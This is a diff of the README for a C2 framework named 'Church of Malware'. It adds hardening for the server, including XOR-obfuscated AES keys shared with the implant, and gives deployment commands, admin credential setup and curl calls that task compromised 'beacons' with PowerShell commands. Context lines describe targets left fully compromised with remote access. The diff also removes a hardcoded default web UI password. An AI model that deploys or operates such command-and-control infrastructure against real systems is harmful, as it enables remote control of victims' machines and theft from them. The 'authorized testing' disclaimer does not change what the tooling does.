@@ -123,13 +123,22 @@ To use your own signed driver:
 
 ## C2 Server Deployment
 
+The C2 server is fully hardened with the following security features:
+- XOR-obfuscated AES keys (same as implant, key 0xDD)
+- JWT secret persisted to file (survives restarts)
+- HTTPS only (HTTP mode removed)
+- Base64 CRLF sanitization for reliable decryption
+- UUID-based beacon IDs (no collisions)
+- Rate limiting on all API endpoints (10-30 requests per minute)
+- HttpOnly, Secure session cookies for web UI
+
 Install dependencies:
 
 ```bash
-pip install flask flask-socketio cryptography werkzeug
+pip install flask flask-socketio cryptography werkzeug flask-limiter
 ```
 
-Generate SSL certificate (for HTTPS):
+Generate SSL certificate:
 
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
@@ -138,7 +147,14 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 Run the C2 server:
 
 ```bash
-python church_c2_server.py --host 0.0.0.0 --port 443
+python church_c2_server.py --host 0.0.0.0 --port 443 --cert cert.pem --key key.pem
+```
+
+Configure admin credentials via environment variables or config file:
+
+```bash
+export CHURCH_ADMIN_USER="admin"
+export CHURCH_ADMIN_HASH="$(python -c 'from werkzeug.security import generate_password_hash; print(generate_password_hash("yourpassword"))')"
 ```
 
 C2 API Endpoints:
@@ -158,9 +174,21 @@ curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
   -H "Content-Type: application/json" \
   -d '{"host": "beacon_id", "command": "Get-Process", "powershell": true}' \
   https://localhost/api/task
+
+# Get beacon details
+curl -H "X-Auth-Token: <JWT_SECRET>" \
+  https://localhost/api/beacon/<beacon_id>
+
+# Get task history
+curl -H "X-Auth-Token: <JWT_SECRET>" \
+  https://localhost/api/tasks/<beacon_id>
+
+# Get system statistics
+curl -H "X-Auth-Token: <JWT_SECRET>" \
+  https://localhost/api/stats
 ```
 
-Web UI Access: https://c2-server:443 (admin / CHURCHadmin2024)
+Web UI Access: https://c2-server:443
 
 ---
 
@@ -220,4 +248,4 @@ The target system remains fully compromised with remote access via the C2 channe
 
 ## Disclaimer
 
-FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY.
+FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY. Unauthorized use violates computer fraud laws. The Church of Malware assumes no liability for misuse.
